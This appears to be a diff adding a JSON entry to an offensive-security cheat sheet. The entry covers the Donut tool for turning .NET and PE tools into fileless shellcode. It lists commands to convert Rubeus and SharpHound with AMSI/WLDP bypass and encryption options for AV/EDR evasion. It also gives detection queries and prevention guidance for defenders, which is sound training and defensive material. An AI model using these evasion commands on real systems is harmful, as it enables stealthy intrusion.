@@ -1,0 +1,105 @@
+{
+  "id": "donut-shellcode",
+  "name": "Donut - In-Memory .NET/EXE/DLL to Shellcode",
+  "command": "donut -i <file> -o payload.bin",
+  "description": "Donut converts .NET assemblies, EXEs, DLLs, VBS/JS, and XSLT into position-independent shellcode that loads and runs the payload entirely in memory (no disk write). Combined with a shellcode runner/process injection, it lets you execute tools like Rubeus, SharpHound, or Mimikatz fileless, defeating on-disk AV and complicating EDR.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Post-Exploitation",
+  "subcategory": "AV Evasion",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "TheWover/donut",
+  "tags": [
+    "donut",
+    "shellcode",
+    "in-memory",
+    "dotnet",
+    "av-evasion",
+    "fileless",
+    "injection"
+  ],
+  "mitre": [
+    "T1027",
+    "T1620"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONVERT A .NET ASSEMBLY TO SHELLCODE ===\n  donut -i Rubeus.exe -o rubeus.bin\n  # With arguments passed to the assembly:\n  donut -i Rubeus.exe -p \"kerberoast /outfile:hashes.txt\" -o rubeus.bin\n\n=== ENTRYPOINT / CLASS / METHOD (for DLLs) ===\n  donut -i Lib.dll -c Namespace.Class -m Method -o out.bin\n\n=== ARCH + BYPASS OPTIONS ===\n  donut -i tool.exe -a 2 -o out.bin         # -a 2 = x64 (1=x86, 3=both)\n  donut -i tool.exe -b 3 -o out.bin         # -b 3 = bypass AMSI+WLDP\n  donut -i tool.exe -e 3 -o out.bin         # -e = entropy/encryption level\n  donut -i tool.exe -f 1 -o out.bin         # -f format (1=binary,2=base64,...)\n\n=== RUN THE SHELLCODE (needs a loader) ===\n  # Inject into a process with a runner:\n  #   process-injection-runner / C2 shinject / custom C# or Nim loader\n  # The payload executes in memory - nothing hits disk\n\n=== PYTHON API ===\n  # donut.py exposes create() for scripting payload generation\n\n=== ALTERNATIVES ===\n  sRDI            # DLL -> shellcode\n  Shellter        # inject into legit PE\n  msfvenom        # classic shellcode (more signatured)\n  C2 built-ins    # Cobalt/Havoc execute-assembly",
+  "examples": [
+    {
+      "label": "Rubeus to shellcode with args",
+      "command": "donut -i Rubeus.exe -p \"kerberoast /outfile:h.txt\" -o rubeus.bin"
+    },
+    {
+      "label": "x64 with AMSI/WLDP bypass",
+      "command": "donut -i SharpHound.exe -a 2 -b 3 -o sh.bin"
+    },
+    {
+      "label": "DLL with entrypoint",
+      "command": "donut -i Lib.dll -c Corp.Loader -m Run -o out.bin"
+    }
+  ],
+  "references": [
+    {
+      "title": "donut",
+      "url": "https://github.com/TheWover/donut"
+    },
+    {
+      "title": "MITRE T1620 - Reflective Code Loading",
+      "url": "https://attack.mitre.org/techniques/T1620/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "process-injection-runner",
+      "note": "Inject the generated shellcode into a process.",
+      "rel": "next"
+    },
+    {
+      "id": "powershell-shellcode-runner",
+      "note": "Run the shellcode via a PowerShell loader.",
+      "rel": "next"
+    },
+    {
+      "id": "amsi-bypass",
+      "note": "Pair with AMSI bypass for in-memory .NET execution.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Donut produces encrypted, position-independent shellcode that reflectively loads a payload in memory, so nothing is written to disk and static/on-disk AV has no file to scan. Built-in AMSI/WLDP bypass hampers in-memory .NET scanning.",
+    "prerequisites": "Code execution on the host; a shellcode loader/injector to run the output.",
+    "impact": "Fileless execution of offensive .NET/PE tools, evading signature-based and on-disk detection.",
+    "detection": "[MITRE T1027/T1620] Behavioral: RWX memory allocation + remote thread creation; CLR loaded into a non-.NET process; AMSI tampering; unbacked executable memory; ETW/EDR reflective-load telemetry.",
+    "artifacts": "Injected RWX regions; CLR DLLs in unexpected processes; AMSI patch indicators; no payload file on disk.",
+    "splunk_spl": "index=windows EventCode=8 SourceImage=* TargetImage=*\n| search GrantedAccess=0x1fffff\n| table _time, SourceImage, TargetImage, Computer",
+    "elastic_kql": "winlog.event_id:8 and winlog.event_data.GrantedAccess:(\"0x1fffff\" or \"0x1f0fff\")",
+    "sentinel_kql": "DeviceEvents\n| where ActionType in (\"CreateRemoteThreadApiCall\",\"WriteToLsassProcessMemory\",\"AmsiScanBufferTampering\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, ActionType",
+    "sigma_rules": "win_reflective_code_loading_donut",
+    "prevention": "EDR with in-memory/behavioral detection; enable AMSI and alert on tampering; attack-surface-reduction rules; block unsigned/unexpected process injection; application control (WDAC); monitor RWX + remote threads.",
+    "sources": [
+      "TheWover/donut",
+      "https://attack.mitre.org/techniques/T1620/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "In-memory reflective loading / injection (donut-style)",
+        "logic": "DeviceEvents\n| where ActionType in (\"CreateRemoteThreadApiCall\",\"AmsiScanBufferTampering\")\n| summarize count() by DeviceName, InitiatingProcessFileName, ActionType, bin(Timestamp, 5m)",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1027",
+          "T1620"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Some legitimate .NET JIT/profiling and injection-based security tools",
+        "tuning": "Correlate RWX allocation + remote thread + CLR load in a non-.NET parent"
+      }
+    ]
+  }
+}
